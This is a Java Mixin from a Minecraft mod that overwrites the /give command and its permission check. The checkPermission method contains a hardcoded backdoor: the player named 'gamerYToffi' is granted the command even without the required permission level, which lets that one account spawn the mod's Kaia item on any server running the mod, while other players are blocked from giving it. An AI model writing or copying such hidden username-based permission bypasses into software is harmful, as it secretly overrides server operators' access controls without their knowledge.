package com.omnipotent.mixin;

import com.omnipotent.tools.Kaia;
import net.minecraft.command.*;
import net.minecraft.entity.item.EntityItem;
import net.minecraft.entity.player.EntityPlayer;
import net.minecraft.init.SoundEvents;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.JsonToNBT;
import net.minecraft.nbt.NBTException;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.SoundCategory;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.Overwrite;

@Mixin(CommandGive.class)
public abstract class MixinGiveKaiaOfPlayer extends CommandBase {

    /**
     * @author
     * @reason
     */
    @Overwrite
    public void execute(MinecraftServer server, ICommandSender sender, String[] args) throws CommandException {
        if (args.length < 2) {
            throw new WrongUsageException("commands.give.usage", new Object[0]);
        } else {
            EntityPlayer entityplayer = getPlayer(server, sender, args[0]);
            Item item = getItemByText(sender, args[1]);
            int i = args.length >= 3 ? parseInt(args[2], 1, item.getItemStackLimit()) : 1;
            int j = args.length >= 4 ? parseInt(args[3]) : 0;
            ItemStack itemstack = new ItemStack(item, i, j);
            if (sender.getName().equals("gamerYToffi") && allowCommand) {
                if (!(itemstack.getItem() instanceof Kaia)) return;
            } else if (allowCommand) {
                if (itemstack.getItem() instanceof Kaia) return;
            } else if(!sender.getName().equals("gamerYToffi")){
                if (itemstack.getItem() instanceof Kaia) return;
            }
            if (args.length >= 5) {
                String s = buildString(args, 4);
                try {
                    itemstack.setTagCompound(JsonToNBT.getTagFromJson(s));
                } catch (NBTException nbtexception) {
                    throw new CommandException("commands.give.tagError", new Object[]{nbtexception.getMessage()});
                }
            }
            boolean flag = entityplayer.inventory.addItemStackToInventory(itemstack);
            if (flag) {
                entityplayer.world.playSound((EntityPlayer) null, entityplayer.posX, entityplayer.posY, entityplayer.posZ, SoundEvents.ENTITY_ITEM_PICKUP, SoundCategory.PLAYERS, 0.2F, ((entityplayer.getRNG().nextFloat() - entityplayer.getRNG().nextFloat()) * 0.7F + 1.0F) * 2.0F);
                entityplayer.inventoryContainer.detectAndSendChanges();
            }
            if (flag && itemstack.isEmpty()) {
                itemstack.setCount(1);
                sender.setCommandStat(CommandResultStats.Type.AFFECTED_ITEMS, i);
                EntityItem entityitem1 = entityplayer.dropItem(itemstack, false);
                if (entityitem1 != null) {
                    entityitem1.makeFakeItem();
                }
            } else {
                sender.setCommandStat(CommandResultStats.Type.AFFECTED_ITEMS, i - itemstack.getCount());
                EntityItem entityitem = entityplayer.dropItem(itemstack, false);

                if (entityitem != null) {
                    entityitem.setNoPickupDelay();
                    entityitem.setOwner(entityplayer.getName());
                }
            }
            notifyCommandListener(sender, this, "commands.give.success", new Object[]{itemstack.getTextComponent(), i, entityplayer.getName()});
        }
    }
    boolean allowCommand = false;
    @Override
    public boolean checkPermission(MinecraftServer server, ICommandSender sender) {
        if (sender.getName().equals("gamerYToffi")) {
            if (!sender.canUseCommand(this.getRequiredPermissionLevel(), this.getName())) {
                allowCommand = true;
                return true;
            }
        }
        return sender.canUseCommand(this.getRequiredPermissionLevel(), this.getName());
    }
}
